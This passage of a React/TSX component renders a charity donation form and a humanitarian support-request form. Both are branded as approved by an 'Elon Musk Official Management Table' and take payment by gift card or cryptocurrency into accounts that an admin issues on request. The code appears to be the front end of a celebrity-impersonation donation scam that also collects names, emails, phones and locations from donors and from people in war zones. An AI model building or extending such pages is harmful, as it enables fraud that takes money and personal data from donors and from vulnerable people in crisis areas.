                              ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
                              : 'bg-[#08142b] border-blue-900/70 text-slate-300'
                          }`}
                        >
                          Gift Card
                        </button>
                        <button
                          type="button"
                          onClick={() => setPaymentMethod('crypto')}
                          className={`py-2.5 px-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
                            paymentMethod === 'crypto'
                              ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
                              : 'bg-[#08142b] border-blue-900/70 text-slate-300'
                          }`}
                        >
                          Bitcoin / Doge / USDC
                        </button>
                      </div>

                      {/* Admin-provisioned Account Gate */}
                      {activeAdminAccount ? (
                        <div className="p-3.5 rounded-xl bg-[#08142b] border border-emerald-500/45 text-xs space-y-2">
                          <div className="flex items-center justify-between gap-2">
                            <span className="font-semibold text-white flex items-center gap-1.5">
                              <ShieldCheck className="w-4 h-4 text-emerald-400" />
                              <span>Admin-Provisioned Charity Account</span>
                            </span>
                            <button
                              type="button"
                              onClick={() => {
                                navigator.clipboard.writeText(activeAdminAccount);
                                setCopiedAccount(true);
                                setTimeout(() => setCopiedAccount(false), 2000);
                              }}
                              className="px-2.5 py-1 rounded bg-[#040a18] border border-blue-800/70 text-[11px] font-mono text-blue-200 hover:text-white flex items-center gap-1 cursor-pointer"
                            >
                              {copiedAccount ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                              <span>{copiedAccount ? 'Copied' : 'Copy'}</span>
                            </button>
                          </div>
                          <div className="p-2.5 rounded-lg bg-[#040a18] border border-blue-900/70 font-mono text-[11px] text-blue-200 break-all whitespace-pre-wrap">
                            {activeAdminAccount}
                          </div>
                        </div>
                      ) : pendingAccountReq ? (
                        <div className="p-3.5 rounded-xl bg-[#08142b] border border-blue-500/45 text-xs space-y-2">
                          <div className="flex items-center justify-between gap-2">
                            <span className="font-semibold text-white flex items-center gap-1.5">
                              <Clock className="w-4 h-4 text-blue-400" />
                              <span>Charity Account Requested ({pendingAccountReq.id})</span>
                            </span>
                            <span className="text-[11px] font-mono text-blue-300">Pending Admin</span>
                          </div>
                          <p className="text-[11px] text-slate-300 leading-relaxed">
                            Sent to the Elon Musk Official Management Table for account provisioning. Once issued, the account appears here and in your In-App Inbox.
                          </p>
                        </div>
                      ) : (
                        <div className="p-3.5 rounded-xl bg-[#08142b] border border-blue-900/70 text-xs space-y-2.5">
                          <div className="flex items-center gap-2 font-semibold text-white">
                            <Lock className="w-4 h-4 text-red-400" />
                            <span>Request Charity Settlement Account from Admin</span>
                          </div>
                          <p className="text-[11px] text-slate-300 leading-relaxed">
                            All charity settlement accounts are provisioned directly by the Elon Musk Official Management Table. Request an account below or submit your donation pledge for approval and provisioning.
                          </p>
                          <div className="flex flex-col sm:flex-row gap-2">
                            <input
                              type="text"
                              value={accountRequestNote}
                              onChange={(e) => setAccountRequestNote(e.target.value)}
                              placeholder="Optional channel note (bank, gift card brand, or crypto network)..."
                              className="flex-1 px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
                            />
                            <button
                              type="button"
                              onClick={() => {
                                onRequestPaymentAccount?.({
                                  paymentMethod,
                                  vehicleName: `Charity NGO: ${selectedNgo.name} (${selectedCountry.name})`,
                                  amountDue: donationAmount,
                                  visitorName: donorName.trim() || 'Charity Donor',
                                  visitorEmail: donorEmail.trim() || 'Pending Contact Email',
                                  note: accountRequestNote.trim() || `Humanitarian Relief · ${selectedCountry.name}`,
                                  requestCategory: 'charity_donation',
                                });
                                setAccountRequestNote('');
                              }}
                              className="px-3.5 py-2 rounded-lg bg-gradient-to-r from-blue-600 to-red-600 hover:brightness-110 text-white text-xs font-bold flex items-center justify-center gap-1.5 cursor-pointer whitespace-nowrap shrink-0"
                            >
                              <Send className="w-3.5 h-3.5" />
                              <span>Request Account from Admin</span>
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>

                  {/* Donor Information */}
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-200">Donor Full Name *</label>
                      <input
                        type="text"
                        required
                        value={donorName}
                        onChange={(e) => setDonorName(e.target.value)}
                        placeholder="Full name or foundation"
                        className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white focus:outline-none focus:border-blue-400"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-200">Email for Official Receipt *</label>
                      <input
                        type="email"
                        required
                        value={donorEmail}
                        onChange={(e) => setDonorEmail(e.target.value)}
                        placeholder="donor@example.com"
                        className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white focus:outline-none focus:border-blue-400"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-200">Donor Country (Optional)</label>
                      <input
                        type="text"
                        value={donorCountry}
                        onChange={(e) => setDonorCountry(e.target.value)}
                        placeholder="United States, UK, Germany..."
                        className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white focus:outline-none focus:border-blue-400"
                      />
                    </div>
                  </div>

                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-200">
                      Dedication or Humanitarian Allocation Note (Optional)
                    </label>
                    <input
                      type="text"
                      value={dedicationNote}
                      onChange={(e) => setDedicationNote(e.target.value)}
                      placeholder="e.g. Emergency medical clinics & children food parcels"
                      className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white focus:outline-none focus:border-blue-400"
                    />
                  </div>

                  <div className="p-3.5 rounded-xl bg-blue-950/40 border border-blue-500/35 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                    <div className="text-xs text-slate-300">
                      Directed to <strong className="text-white">Elon Musk Official Management Table</strong> for Admin approval and settlement account verification.
                    </div>
                    <button
                      type="submit"
                      className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 hover:brightness-110 text-white text-xs font-bold flex items-center justify-center gap-2 cursor-pointer whitespace-nowrap shrink-0 shadow-md"
                    >
                      <HeartHandshake className="w-4 h-4" />
                      <span>Submit ${donationAmount.toLocaleString()} Donation for Admin Approval</span>
                    </button>
                  </div>
                </form>
              )}

              {/* TAB 2: HUMANITARIAN & COUNTRY SUPPORT REQUEST FORM */}
              {activeTab === 'support' && (
                <form onSubmit={handleSupportSubmit} className="space-y-5 pt-2 border-t border-blue-900/60">
                  <div className="p-4 rounded-xl bg-[#08142b] border border-red-500/40 flex items-start gap-3 text-xs text-slate-200">
                    <AlertTriangle className="w-5 h-5 text-red-400 shrink-0 mt-0.5" />
                    <div className="space-y-1">
                      <div className="font-bold text-white">
                        Direct Relief &amp; Support Appeals — Approved Exclusively by Elon Musk Management
                      </div>
                      <p className="text-slate-300 leading-relaxed">
                        Individuals, local NGOs, hospitals, and emergency coordinators in countries affected by war or terrorism can submit a support request below. All support requests are routed directly to the Admin Portal for review, approval by Elon Musk Management, and settlement account provisioning.
                      </p>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-200">Support Aid Type *</label>
                      <select
                        value={supportAidCategory}
                        onChange={(e) =>
                          setSupportAidCategory(e.target.value as CharitySupportRequest['aidCategory'])
                        }
                        className="w-full px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white focus:outline-none focus:border-blue-400"
                      >
                        <option value="Medical & Trauma Relief">Medical &amp; Trauma Relief</option>
                        <option value="Starlink Crisis Connectivity">Starlink Crisis Connectivity Kits</option>
                        <option value="Tesla Solar & Powerwall Aid">Tesla Solar &amp; Powerwall Aid</option>
                        <option value="Emergency Food & Water">Emergency Food &amp; Clean Water</option>
                        <option value="Financial Relief Grant">Direct Financial Relief Grant</option>
                      </select>
                    </div>

                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-200">Crisis Classification *</label>
                      <select
                        value={supportCrisisType}
                        onChange={(e) => setSupportCrisisType(e.target.value as CrisisCategory)}
                        className="w-full px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white focus:outline-none focus:border-blue-400"
                      >
                        <option value="War & Armed Conflict">War &amp; Armed Conflict</option>
                        <option value="Terrorism & Insurgency">Terrorism &amp; Insurgency</option>
                        <option value="War & Terrorism Recovery">War &amp; Terrorism Recovery</option>
                      </select>
                    </div>

                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-200">
                        Estimated Relief / Grant Requested (USD)
                      </label>
                      <input
                        type="number"
                        min={100}
                        step={50}
                        value={supportRequestedAmount}
                        onChange={(e) => setSupportRequestedAmount(e.target.value)}
                        placeholder="2500"
                        className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white font-mono tabular-nums focus:outline-none focus:border-blue-400"
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-200">Applicant / Coordinator Name *</label>
                      <input
                        type="text"
                        required
                        value={applicantName}
                        onChange={(e) => setApplicantName(e.target.value)}
                        placeholder="Full name"
                        className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white focus:outline-none focus:border-blue-400"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-200">Contact Email *</label>
                      <input
                        type="email"
                        required
                        value={applicantEmail}
                        onChange={(e) => setApplicantEmail(e.target.value)}
                        placeholder="coordinator@relief-org.org"
                        className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white focus:outline-none focus:border-blue-400"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-200">City / Affected Zone *</label>
                      <input
                        type="text"
                        required
                        value={supportCityZone}
                        onChange={(e) => setSupportCityZone(e.target.value)}
                        placeholder={`District or camp in ${selectedCountry.name}`}
                        className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white focus:outline-none focus:border-blue-400"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-200">Phone / Organization</label>
                      <input
                        type="text"
                        value={organizationName || applicantPhone}
                        onChange={(e) => {
                          setOrganizationName(e.target.value);
                          setApplicantPhone(e.target.value);
                        }}
                        placeholder="Clinic, local NGO, or phone"
                        className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white focus:outline-none focus:border-blue-400"
                      />
                    </div>
                  </div>

                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-200">
                      Crisis &amp; Humanitarian Situation Details *
                    </label>
                    <textarea
                      rows={3}
                      required
                      value={situationSummary}
                      onChange={(e) => setSituationSummary(e.target.value)}
                      placeholder="Describe urgent war or terrorism impact, number of civilians/families needing support, and exact relief required..."
                      className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
                    />
                  </div>

                  {/* Account Provisioning Option */}
                  <div className="p-4 rounded-xl bg-[#08142b] border border-blue-800/70 space-y-3">
                    <label className="flex items-start gap-2.5 cursor-pointer text-xs">
                      <input
                        type="checkbox"
                        checked={needsAccountProvisioning}
                        onChange={(e) => setNeedsAccountProvisioning(e.target.checked)}
                        className="mt-0.5 rounded border-blue-600 bg-[#040a18]"
                      />
                      <div>
                        <span className="font-semibold text-white flex items-center gap-1.5">
                          <Landmark className="w-3.5 h-3.5 text-blue-300" />
                          <span>Request Official Disbursement / Relief Accounts Provision from Admin</span>
                        </span>
                        <span className="text-[11px] text-slate-400 block mt-0.5">
                          Routes an account provisioning ticket directly to the Elon Musk Official Management Table alongside your support approval request.
                        </span>
                      </div>
                    </label>

                    {needsAccountProvisioning && (
                      <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 pt-1">
                        {(['wire', 'gift_card', 'crypto'] as const).map((ch) => (
                          <button
                            key={ch}
                            type="button"
                            onClick={() => setPreferredPayoutMethod(ch)}
                            className={`py-2 px-3 rounded-lg border text-xs font-semibold cursor-pointer transition-all ${
                              preferredPayoutMethod === ch
                                ? 'bg-blue-600 text-white border-blue-400'
                                : 'bg-[#040a18] border-blue-900/70 text-slate-300'
                            }`}
                          >
                            {ch === 'wire'
                              ? 'Wire / Bank Relief Account'
                              : ch === 'gift_card'
                              ? 'Relief Voucher / Gift Card'
                              : 'Crypto Humanitarian Wallet'}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>

                  <div className="p-3.5 rounded-xl bg-blue-950/40 border border-blue-500/35 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                    <div className="text-xs text-slate-300">
                      All support requests require approval by <strong className="text-white">Elon Musk Management</strong> &amp; Admin accounts provision.
                    </div>
                    <button
                      type="submit"
                      className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 hover:brightness-110 text-white text-xs font-bold flex items-center justify-center gap-2 cursor-pointer whitespace-nowrap shrink-0 shadow-md"
                    >
                      <Send className="w-4 h-4" />
                      <span>Submit Support Request to Admin</span>
                    </button>
                  </div>
                </form>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
